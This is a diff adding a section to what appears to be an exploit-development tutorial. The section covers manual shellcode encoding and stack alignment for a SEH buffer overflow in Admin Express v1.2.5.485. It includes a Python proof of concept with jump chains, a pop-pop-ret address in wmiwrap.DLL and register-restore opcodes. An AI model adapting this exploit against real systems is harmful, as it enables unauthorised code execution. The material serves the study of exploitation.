@@ -232,3 +232,45 @@ Because of these contraints, we are going to shift our focus here. If we wanted 
 The `calc.exe` shellcode I will be using is 16 bytes. Shortly, you will see why I chose a small payload for this demonstration. Also bear in mind, since we are encoding, there must be some decoding to execute. There will be approximately four to six lines of opcodes for every one line we need actually need to execute. This is why with a reverse shell, you would need to jump back into the buffer of A's to obtain a shell. Again, I will just demonstrate a small payload without the jump. This same technique applies to a normal shell.
 
 Let's begin with talking about why we need to take into consideration the [LIFO](https://www.cs.cmu.edu/~adamchik/15-121/lectures/Stacks%20and%20Queues/Stacks%20and%20Queues.html) (Last In First Out) structure of the stack.
+
+Since we are not using Metasploit, we are going to manually encode our shellcode. What we are going to do, at a high level, is an alignment of the stack. We are going to manipulate the stack to make the location of `EAX` equal to `ESP`. We will get to the low level details about using `EAX` to put our shellcode on the stack, but for right now let me explain about this stack alignment. Since `EAX` will be the same location of `ESP`, we will essentially be putting our shellcoded onto the top of the stack (remember that ESP points to the top of the stack). Since the stack is __LIFO__, our shellcode will be writing to lower memory addresses. This means we will need to start with the __END__ of our shellcode. 
+
+Here is an anaology of what I am trying to relay. Imagine I ask you to write an essay. In English, we start with the top left hand of the page and we write from left to right until we reach the bottom right hand corner. There is only one stipulation for this essay I would like you to write. I would like you to start at the bottom of the page, and work your way up the page. If you started with the last word of your essay in the bottom right hand corner of the page, and continued to write backwards from right to left, you would have a coherent essay in the end!
+
+This is essentially what we are going to be doing. We are going to use `EAX` to write to where `ESP` is located. This will mean we will be writing to the top of the stack, which will go to lower addresses. Knowing this now, let's align the stack!
+
+Before we align the stack, recall what was mentioned above about saving the current stack pointer (after all of our jumps). Since we need to save the stack pointer, let's use `ECX`. To do this we are going to use a `push esp` instruction to get the current stack pointer vaule onto the stack. We then are going to use a `pop ecx` instruction to __POP__ whatever is on top of the stack (which is the stack pointer now), into `ECX`. Here is the updated PoC:
+
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+
+# We need to save the current stack pointer before execution of shellcode, due to
+# old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
+restore = "\x54" 			# push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
+restore += "\x59" 			# pop ecx; (holding the value of old ESP in ECX, to be called later.)
+restore += "\x51" 			# push ecx; (to get the value on the stack for the mov esp command later)
+
+# There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
+# so we have enough room for our shellcode and to decode.
+payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
+payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += restore
+payload += "\x43" * (5000-len(payload))
+
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
+```
